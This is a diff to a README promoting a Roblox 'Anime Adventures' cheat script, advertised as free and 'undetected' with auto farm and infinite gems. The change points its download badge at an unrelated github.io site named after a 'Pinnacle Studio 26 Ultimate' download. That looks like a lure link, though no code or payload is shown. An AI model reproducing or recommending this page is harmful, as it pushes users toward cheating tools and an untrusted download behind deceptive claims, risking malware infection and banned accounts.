@@ -2,7 +2,7 @@
 
 This powerful **Anime Adventures Script** for Roblox includes auto farm, infinite gems, auto collect, auto upgrade, and many more features — all wrapped in a clean, user-friendly GUI. 100% free and undetected.
 
-[![Download Script](https://img.shields.io/badge/Download-Anime_Adventures_Script-blueviolet)](https://anime-adventures-script-auto-farm.github.io/.github)
+[![Download Script](https://img.shields.io/badge/Download-Anime_Adventures_Script-blueviolet)](https://pinnacle-studio-26-ultimate-download.github.io/.github/)
 
 ---
 
